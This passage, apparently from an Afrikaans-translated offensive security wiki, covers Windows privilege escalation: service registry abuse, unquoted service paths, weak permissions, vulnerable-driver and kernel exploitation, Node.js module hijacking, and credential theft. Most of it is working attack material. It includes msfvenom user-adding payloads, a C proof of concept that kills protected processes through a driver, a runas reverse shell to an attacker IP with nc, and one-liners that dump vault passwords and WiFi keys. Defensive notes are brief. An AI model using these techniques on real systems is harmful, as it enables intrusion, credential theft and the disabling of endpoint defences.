- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Kies ’n service wat ’n normale gebruiker kan start (byvoorbeeld **`msiserver`**) en trigger dit ná die write. **Nota:** die public exploit implementation **locks the workstation** as deel van die race.

Example tooling (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Dienste-register AppendData/AddSubdirectory-permissies

As jy hierdie permission oor ’n registry het, beteken dit **jy kan subregistries vanaf hierdie een skep**. In die geval van Windows-dienste is dit **genoeg om arbitrêre code uit te voer:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

As die pad na ’n executable nie binne aanhalingstekens is nie, sal Windows probeer om elke gedeelte voor ’n spasie uit te voer.

Byvoorbeeld, vir die pad _C:\Program Files\Some Folder\Service.exe_ sal Windows probeer om die volgende uit te voer:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Lys alle ongequoteerde dienspaaie, met uitsluiting van dié wat aan ingeboude Windows-dienste behoort:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Jy kan hierdie kwesbaarheid met metasploit opspoor en uitbuit**: `exploit/windows/local/trusted\_service\_path` Jy kan handmatig 'n service binary met metasploit skep:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Herstelaksies

Windows laat gebruikers toe om aksies te spesifiseer wat uitgevoer moet word indien ’n diens misluk. Hierdie funksie kan gekonfigureer word om na ’n binary te wys. Indien hierdie binary vervangbaar is, kan privilege escalation moontlik wees. Meer besonderhede kan in die [amptelike dokumentasie](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) gevind word.

## Toepassings

### Geïnstalleerde toepassings

Gaan die **toestemmings van die binaries** na (miskien kan jy een oorskryf en privilege escalation uitvoer) en van die **vouers** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Skryftoestemmings

Kontroleer of jy een of ander config-lêer kan wysig om ’n spesiale lêer te lees, of of jy een of ander binary kan wysig wat deur ’n Administrator-rekening uitgevoer gaan word (schedtasks).

’n Manier om swak vouer-/lêertoestemmings in die stelsel te vind, is om die volgende te doen:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/uitvoering

Notepad++ laai enige plugin-DLL onder sy `plugins`-subvouers outomaties. Indien ’n skryfbare portable/kopie-installasie teenwoordig is, gee die plasing van ’n kwaadwillige plugin outomatiese kode-uitvoering binne `notepad++.exe` tydens elke bekendstelling (insluitend vanuit `DllMain` en plugin-callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Begin tydens opstart

**Kontroleer of jy ’n registerinskrywing of binêre lêer kan oorskryf wat deur ’n ander gebruiker uitgevoer gaan word.**\
**Lees** die **volgende bladsy** om meer te leer oor interessante **autorun-liggings om privileges te eskaleer**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drywers

Soek na moontlike **vreemde/kwesbare derdeparty-**drywers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
As 'n driver 'n arbitrary kernel read/write primitive blootstel (algemeen in swak ontwerpte IOCTL handlers), kan jy eskaleer deur 'n SYSTEM token direk uit kernel memory te steel.<sup>[[13]](#references)</sup> Sien die stap-vir-stap-tegniek hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Vir race-condition bugs waar die kwesbare oproep 'n attacker-controlled Object Manager path oopmaak, kan jy die lookup doelbewus vertraag (deur komponente met maksimum lengte of diep directory chains te gebruik) om die venster van mikrosekondes na tientalle mikrosekondes uit te rek:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool disclosures, en I/O ring pivots

Sommige Windows kernel LPE chains kan uit twee individueel swak bugs gebou word: 'n **cancel-safe queue lifetime race** wat 'n request/CBD vrylaat terwyl die queue lock steeds gehou word, en 'n **lock-release-before-copy** disclosure wat 'n vrygestelde paged-pool allocation tydens `RtlCopyToUser` lekan.<sup>[[29]](#references)</sup>

Oudit- en exploitation-notas:

- **Free-under-lock + cancel afterwards**: soek 'n success path wat **Acquire -> CompleteRequest/free -> Release** uitvoer, terwyl die cancel path **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** uitvoer. As die success path `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` bereik voordat die CBDQ/CSQ lock vrygestel word, kan 'n thread wat in `NtCancelIoFileEx -> IopCsqCancelRoutine` geblokkeer is later voortgaan en 'n vrygestelde `PFLT_CALLBACK_DATA` teruggee aan die driver se remove callback.
- **Reclaim the freed queue object** met 'n same-sized, attacker-controlled paged-pool allocation. `NPFS` Data Queue Entries is nuttig omdat die payload en size beheerbaar is en jy dit later met pipe read/peek-operasies kan ondersoek. As die vrygestelde object list links insluit, overwrite dit met 'n **cyclic list of fake request nodes in user memory** sodat die driver herhaaldelik attacker-defined request structures verwerk in plaas daarvan om by die oorspronklike list head te termineer.
- **Upgrade a predictable write**: as die fake request 'n nested context pointer herlei wat vir bookkeeping writes gebruik word (timestamps / QPC / refcount-adjacent fields), kan jy 'n **address-controlled but not value-controlled** kernel write kry. Teiken in daardie geval 'n sprayed pool object's **length/size** field in plaas van 'n finale code/data pointer, en enumerate dan die spray totdat die beskadigde object 'n **out-of-bounds paged-pool read** lewer.
- **Raceable disclosure pattern**: enige syscall wat `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` doen, is 'n sterk kandidaat. Reliability verbeter wanneer die attacker die gekopieerde buffer kan vergroot (byvoorbeeld deur baie list/resource entries by te voeg wat 'n serializer se finale allocation size verhoog), omdat die langer copy die replacement window verbreed sonder om noodwendig die masjien te laat crash.
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer arrays is uitstekende disclosure targets omdat hul paged-pool size deur die attacker beheer word (`8 * regBufferCnt`) en elke element 'n kernel pointer na 'n `_IOP_MC_BUFFER_ENTRY` is. Leak een van hierdie arrays, recover die omliggende `IORING_OBJECT`, en corrupt dan **`RegBuffers`** en **`RegBuffersCount`** sodat daaropvolgende I/O ring-operasies attacker-forged entries verbruik en arbitrary kernel read/write verskaf. As die enigste beskikbare write jou 'n stabiele byte gee (byvoorbeeld vanaf `KUSER_SHARED_DATA+0x14`), gebruik **overlapping unaligned writes** om 'n repeated-byte user pointer soos `0x0101010101010101` te bou, map dit met `VirtualAlloc`, en plaas die forged registered-buffer array daar.<sup>[[30]](#references)</sup>

Nuttige debugging indicators:
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
Sodra jy arbitrary kernel read/write van die beskadigde I/O ring verkry, steel ’n SYSTEM-token deur die standaard post-primitive workflow te gebruik:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive-geheuekorrupsie-primitives

Moderne hive-kwesbaarhede laat jou toe om deterministiese uitlegte te groom, skryfbare HKLM/HKU-afstammelinge te misbruik, en metadata-korrupsie in kernel paged-pool-oorlope om te skakel sonder ’n custom driver. Leer die volledige ketting hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode-tipeverwarring vanaf aanvallerbeheerde paaie

Sommige drivers aanvaar ’n registry-pad vanaf userland, valideer net dat dit ’n geldige UTF-16-string is, en roep dan `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` met `RTL_QUERY_REGISTRY_DIRECT` na ’n stack-skalaar soos `int readValue`. Indien `RTL_QUERY_REGISTRY_TYPECHECK` ontbreek, word `EntryContext` volgens die **werklike** registry-tipe geïnterpreteer, nie volgens die tipe wat die ontwikkelaar verwag het nie.

Dit skep twee nuttige primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ’n gebruikerbeheerde absolute `\Registry\...`-pad laat die driver toe om sleutels wat deur die aanvaller gekies is, te navraag, bestaan deur terugkeerkodes/logboeke uit te lek, en soms waardes te lees waartoe die caller nie direk toegang sou hê nie.
- **Kernel memory corruption**: ’n skalaarbestemming soos `&readValue` word volgens die tipe van die registry-waarde as ’n `REG_QWORD`, `UNICODE_STRING` of groottegebaseerde binary buffer geïnterpreteer.

Praktiese uitbuitingsnotas:

- **Windows 8+-versagting**: indien die navraag ’n **untrusted hive** met `RTL_QUERY_REGISTRY_DIRECT` sonder `RTL_QUERY_REGISTRY_TYPECHECK` tref, crash kernel callers met `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Om exploitability te behou, soek eerder **attacker-writable keys binne trusted system hives** as om waardes onder `HKCU` te stage.
- **Trusted-hive staging**: gebruik NtObjectManager om skryfbare afstammelinge van `\Registry\Machine` te enumereer, en voer die scan weer uit met ’n gedupliseerde **low-integrity** token om sleutels te vind wat vanuit sandboxed contexts bereikbaar is:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: ’n 8-grepe direkte skrywing na ’n 4-greep `int` korrupteer aangrensende stack-data en kan ’n nabygeleë callback/function pointer gedeeltelik oorskryf.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode verwag dat `EntryContext` na ’n `UNICODE_STRING` wys. As die kode eers ’n aanvaller-beheerde `REG_DWORD` in ’n stack-skalaar laai en dan dieselfde buffer vir ’n string-read hergebruik, beheer die aanvaller `Length`/`MaximumLength` en beïnvloed hy die `Buffer`-pointer gedeeltelik, wat ’n semi-beheerde kernel-skrywing oplewer.
- **`REG_BINARY`**: vir groot binary data behandel direct mode die eerste `LONG` by `EntryContext` as ’n signed buffer size. As ’n vorige `REG_DWORD`-read ’n **negatiewe**, aanvaller-beheerde waarde in die hergebruikte skalaar laat, kopieer die volgende `REG_BINARY`-query aanvaller-bytes direk oor aangrensende stack-slots, wat dikwels die skoonste pad na ’n volledige callback-pointer-oorskrywing is.

Sterk hunting pattern: **heterogeneous registry reads na dieselfde stack-variable sonder om dit te herinitialiseer**. Grep vir `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, hergebruikte `EntryContext`-pointers, en code paths waar die eerste registry-read beheer of ’n tweede read plaasvind.

#### Misbruik van ontbrekende FILE_DEVICE_SECURE_OPEN op device objects (LPE + EDR kill)

Sommige signed third-party drivers skep hul device object met ’n sterk SDDL via IoCreateDeviceSecure, maar vergeet om FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics te stel. Sonder hierdie flag word die secure DACL nie afgedwing wanneer die device oopgemaak word deur ’n path wat ’n ekstra component bevat nie, wat enige unprivileged user toelaat om ’n handle te verkry deur ’n namespace path soos die volgende te gebruik:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (uit ’n real-world case)

Sodra ’n user die device kan oopmaak, kan privileged IOCTLs wat deur die driver blootgestel word vir LPE en tampering misbruik word. Voorbeeldvermoëns wat in the wild waargeneem is:
- Return full-access handles na arbitrêre prosesse (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrêre prosesse, insluitend Protected Process/Light (PP/PPL), wat AV/EDR kill from user land via kernel moontlik maak.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- Stel altyd FILE_DEVICE_SECURE_OPEN wanneer jy device objects skep wat bedoel is om deur ’n DACL beperk te word.
- Valideer die oproeper se konteks vir bevoorregte operasies. Voeg PP/PPL-kontroles by voordat process termination of handle returns toegelaat word.
- Beperk IOCTLs (access masks, METHOD_*, input validation) en oorweeg brokered models in plaas van direkte kernel privileges.

Detection ideas for defenders
- Monitor user-mode opens van verdagte device names (bv. \\ .\\amsdk*) en spesifieke IOCTL-sequences wat op misbruik dui.
- Dwing Microsoft se vulnerable driver blocklist (HVCI/WDAC/Smart App Control) af en handhaaf jou eie allow/deny lists.


## PATH DLL Hijacking

As jy **write permissions binne ’n folder op PATH** het, kan jy moontlik ’n DLL hijack wat deur ’n process gelaai word en **privileges eskaleer**.

Kontroleer die permissions van alle folders binne PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vir meer inligting oor hoe om hierdie kontrole te misbruik:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Dit is ’n **Windows uncontrolled search path**-variant wat **Node.js**- en **Electron**-toepassings raak wanneer hulle ’n onverwerkte import soos `require("foo")` uitvoer en die verwagte module **ontbreek**.<sup>[[20]](#references)</sup>

Node los pakkette op deur die gidsboom op te loop en `node_modules`-vouers in elke ouergids na te gaan. Op Windows kan hierdie soektog die skyfwortel bereik, sodat ’n toepassing wat vanaf `C:\Users\Administrator\project\app.js` geloods word, uiteindelik die volgende kan ondersoek:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

As ’n **low-privileged user** `C:\node_modules` kan skep, kan hulle ’n kwaadwillige `foo.js` (of pakketgids) plaas en wag dat ’n **higher-privileged Node/Electron process** die ontbrekende dependency probeer oplos. Die payload loop binne die sekuriteitskonteks van die slagofferproses, dus word dit **LPE** wanneer die teiken as ’n administrator, vanuit ’n elevated scheduled task/service wrapper, of vanuit ’n outomaties gestartte privileged desktop app loop.

Dit kom veral algemeen voor wanneer:

- ’n dependency in `optionalDependencies` verklaar word<sup>[[22]](#references)</sup>
- ’n third-party library `require("foo")` in `try/catch` omvou en voortgaan wanneer dit misluk
- ’n pakket uit production builds verwyder is, tydens packaging weggelaat is, of nie geïnstalleer kon word nie
- die kwesbare `require()` diep binne die dependency tree voorkom eerder as in die hoof-toepassingskode

### Soek na kwesbare teikens

Gebruik **Procmon** om die resolution path te bewys:<sup>[[23]](#references)</sup>

- Filter volgens `Process Name` = die teikenuitvoerbare lêer (`node.exe`, die Electron-app se EXE, of die wrapper process)
- Filter volgens `Path` `contains` `node_modules`
- Fokus op `NAME NOT FOUND` en die finale suksesvolle open onder `C:\node_modules`

Nuttige code-review-patrone in uitgepakte `.asar`-lêers of toepassingsbronne:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Uitbuiting

1. Identifiseer die **ontbrekende pakketnaam** vanaf Procmon of bronkode-oorsig.
2. Skep die wortel-opsoekgids indien dit nog nie bestaan nie:
```powershell
mkdir C:\node_modules
```
3. Plaas ’n module met die presies verwagte naam:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Trigger die victim application. As die application `require("foo")` probeer en die legitieme module afwesig is, kan Node `C:\node_modules\foo.js` laai.

Werklike voorbeelde van ontbrekende optional modules wat by hierdie patroon pas, sluit `bluebird` en `utf-8-validate` in, maar die **technique** is die herbruikbare deel: vind enige **missing bare import** wat ’n gepriviligeerde Windows Node/Electron-proses sal resolve.

### Detection en hardening-idees

- Genereer ’n alert wanneer ’n user `C:\node_modules` skep of nuwe `.js`-lêers/packages daar skryf.
- Hunt vir high-integrity processes wat vanaf `C:\node_modules\*` lees.
- Package alle runtime dependencies in production en oudit die gebruik van `optionalDependencies`.
- Hersien third-party code vir stil `try { require("...") } catch {}`-patrone.
- Disable optional probes wanneer die library dit ondersteun (byvoorbeeld, sommige `ws`-deployments kan die legacy `utf-8-validate`-probe vermy met `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Kontroleer vir ander bekende rekenaars wat in die hosts file hardgekodeer is
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netwerkkoppelvlakke & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Oop Poorte

Kontroleer vir **beperkte dienste** van buite af
```bash
netstat -ano #Opened ports?
```
### Roeteringstabel
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-tabel
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall-reëls

[**Kyk na hierdie bladsy vir Firewall-verwante opdragte**](../basic-cmd-for-pentesters.md#firewall) **(lys reëls, skep reëls, skakel af, skakel af...)**

[Meer opdragte vir network enumeration hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Die binêre `bash.exe` kan ook gevind word in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

As jy die root-gebruiker verkry, kan jy op enige poort luister (die eerste keer wat jy `nc.exe` gebruik om op ’n poort te luister, sal dit via die GUI vra of `nc` deur die firewall toegelaat moet word).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Om bash maklik as root te begin, kan jy `--default-user root` probeer

Jy kan die `WSL`-lêerstelsel verken in die vouer `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows-aanmeldbewyse

### Winlogon-aanmeldbewyse
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Die Windows Vault stoor gebruikers se aanmeldbewyse vir bedieners, webwerwe en ander programme waarby **Windows** gebruikers **outomaties kan aanmeld**. Met die eerste oogopslag mag dit lyk asof gebruikers nou hul Facebook-aanmeldbewyse, Twitter-aanmeldbewyse, Gmail-aanmeldbewyse, ensovoorts kan stoor sodat hulle outomaties via browsers aanmeld. Maar dit is nie die geval nie.

Windows Vault stoor aanmeldbewyse waarmee Windows gebruikers outomaties kan aanmeld, wat beteken dat enige **Windows-toepassing wat aanmeldbewyse benodig om toegang tot ’n hulpbron te verkry** (bediener of webwerf) **hierdie Credential Manager** & Windows Vault **kan gebruik en die verskafde aanmeldbewyse kan gebruik, in plaas daarvan dat gebruikers elke keer die gebruikersnaam en wagwoord moet invoer**.

Tensy die toepassings met Credential Manager kommunikeer, dink ek nie dit is vir hulle moontlik om die aanmeldbewyse vir ’n gegewe hulpbron te gebruik nie. As jou toepassing dus van die vault wil gebruik maak, moet dit op een of ander manier **met die credential manager kommunikeer en die aanmeldbewyse vir daardie hulpbron** vanaf die verstekbergingsvault aanvra.

Gebruik `cmdkey` om die gestoorde aanmeldbewyse op die masjien te lys.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dan kan jy `runas` met die `/savecred`-opsies gebruik om die gestoorde credentials te gebruik. Die volgende voorbeeld roep 'n remote binary via 'n SMB share aan.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Gebruik `runas` met 'n verskafde stel geloofsbriewe.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Let daarop dat mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), of vanaf [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Moderne Windows UWP-toepassings, Microsoft Edge en moderne stelseldienste stoor authentication tokens en plaintext-wagwoorde binne die Universal Windows Platform (UWP) `PasswordVault` (ook as `Web Credentials` in `vaultcmd` blootgestel). Hierdie stoorspasie is session-isolated en kan native decrypted word sonder administratiewe of `SeDebugPrivilege`-regte.

Voer hierdie PowerShell-opdrag binne die gebruiker se aktiewe session uit om alle gestoorde gebruikersname en plaintext-wagwoorde onmiddellik te dump en te decrypt:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

Die **Data Protection API (DPAPI)** bied 'n metode vir die simmetriese encryption van data, wat hoofsaaklik binne die Windows-bedryfstelsel gebruik word vir die simmetriese encryption van private asimmetriese sleutels. Hierdie encryption gebruik 'n gebruiker- of stelselgeheim om beduidend tot die entropie by te dra.

**DPAPI maak die encryption van sleutels moontlik deur middel van 'n simmetriese sleutel wat van die gebruiker se login-geheime afgelei word**. In scenario's wat stelselencryption behels, gebruik dit die stelsel se domeinauthentication-geheime.

Geënkripteerde RSA-gebruikersleutels word, deur DPAPI te gebruik, in die `%APPDATA%\Microsoft\Protect\{SID}`-gids gestoor, waar `{SID}` die gebruiker se [Sekuriteitsidentifiseerder](https://en.wikipedia.org/wiki/Security_Identifier) verteenwoordig. **Die DPAPI-sleutel, wat saam met die master key wat die gebruiker se private sleutels in dieselfde lêer beskerm gestoor word**, bestaan tipies uit 64 grepe ewekansige data. (Dit is belangrik om daarop te let dat toegang tot hierdie gids beperk is, wat verhoed dat die inhoud daarvan deur middel van die `dir`-opdrag in CMD gelys word, hoewel dit deur PowerShell gelys kan word.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Jy kan die **mimikatz module** `dpapi::masterkey` met die toepaslike argumente (`/pvk` of `/rpc`) gebruik om dit te dekripteer.

Die **credentials-lêers wat deur die hoofwagwoord beskerm word**, is gewoonlik geleë in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Jy kan die **mimikatz module** `dpapi::cred` met die toepaslike `/masterkey` gebruik om dit te decrypt.\
Jy kan baie **DPAPI** **masterkeys** uit **memory** onttrek met die `sekurlsa::dpapi` module (indien jy root is).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** word dikwels vir **scripting** en outomatiseringstake gebruik as ’n manier om encrypted credentials gerieflik te stoor. Die credentials word met **DPAPI** beskerm, wat tipies beteken dat hulle slegs deur dieselfde gebruiker op dieselfde rekenaar waarop hulle geskep is, gedecrypt kan word.

Om PS credentials uit die lêer wat dit bevat te **decrypt**, kan jy die volgende doen:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### WiFi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gestoorde RDP-verbindings

Jy kan hulle vind by `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
en in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Onlangs uitgevoerde opdragte
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Bestuurder vir aanmeldingsinligting vir afgeleë werkskerms**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Gebruik die **Mimikatz** `dpapi::rdg`-module met die toepaslike `/masterkey` om **enige .rdg-lêers te dekripteer**\
Jy kan **baie DPAPI-masterkeys** uit die geheue onttrek met die Mimikatz `sekurlsa::dpapi`-module

### Sticky Notes

Mense gebruik dikwels die StickyNotes-toepassing op Windows-werkstasies om **wagwoorde** en ander inligting te **stoor**, sonder om te besef dat dit ’n databasislêer is. Hierdie lêer is geleë by `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` en is altyd die moeite werd om na te soek en te ondersoek.

### AppCmd.exe

**Let daarop dat jy Administrator moet wees en onder ’n High Integrity-vlak moet loop om wagwoorde uit AppCmd.exe te herwin.**\
**AppCmd.exe** is in die `%systemroot%\system32\inetsrv\`-gids geleë.\
As hierdie lêer bestaan, is dit moontlik dat sommige **aanmeldbewyse** gekonfigureer is en **herwin** kan word.

